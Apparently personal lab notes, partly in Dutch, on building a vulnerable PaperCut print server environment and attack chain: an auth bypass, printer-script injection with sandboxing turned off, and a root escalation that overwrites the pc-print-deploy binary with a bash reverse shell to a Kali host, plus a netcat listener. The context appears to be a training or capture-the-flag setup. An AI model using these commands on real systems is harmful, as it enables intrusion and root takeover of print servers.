# Notes

- bypass works.
- For the rest I need to be able to add a dummy printer...

## Todo

- [x] FIX after rerunning script, port 9192 is not in use anymore?
  - gewoon wachten
- [ ] add provision of kali vm
  - auto copy of the one we use for csv?
  - also in `192.168.100.0/24` range
- [x] Add printer
  - scripting does not work on template printer

- [x] check js packet
  - kali vm on `192.168.100.60` does not pickup the js script

```txt
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

## Scribbles

### 2026-04-18

inject werkt. Deze moet nog geautomatiseerd worden...

dan voor root escalation

```bash
ls -la /home/papercut/providers/print-deploy/linux-x64
mv /home/papercut/providers/print-deploy/linux-x64/pc-print-deploy /home/papercut/providers/print-deploy/linux-x64/pc-print-deploy.bak
echo '#!/bin/bash' > /home/papercut/providers/print-deploy/linux-x64/pc-print-deploy
echo 'bash -i >& /dev/tcp/192.168.100.60/4445 0>&1' >> /home/papercut/providers/print-deploy/linux-x64/pc-print-deploy
chmod +x /home/papercut/providers/print-deploy/linux-x64/pc-print-deploy
```

dan wachten op reboot en `nc -lvnp 4445`

- admin creation werkt niet meer dus moet nu weer manueel?
  - en denk dat dit dummy printer breekt
  - maar eigenlijk niet nodig
    - want is de bedoeling dat 'hacker' zelf admin user maakt.
    - maar dan eens kijken of printer al gemaakt is...

### 2026-04-21

- alles werkt nu
- 2 kleine problemen
  - 1
    - printers worden pas toegevoegd naa init van andmin, dus moet script 2 keer uitvoeren
  - 2
    - config wordt niet automatisch door pwn script aangepast dus krijgt dan error code 200...
    - na manueel `print.script.sandboxed => N` en `print-and-device.script.enabled => Y` dan werkt het wel.

- restart ubuntu vm na hijack voor root access.
  - je kan eerst eens `cat /home/papercut/providers/print-deploy/linux-x64/pc-print-deploy` doen om hijack te kijken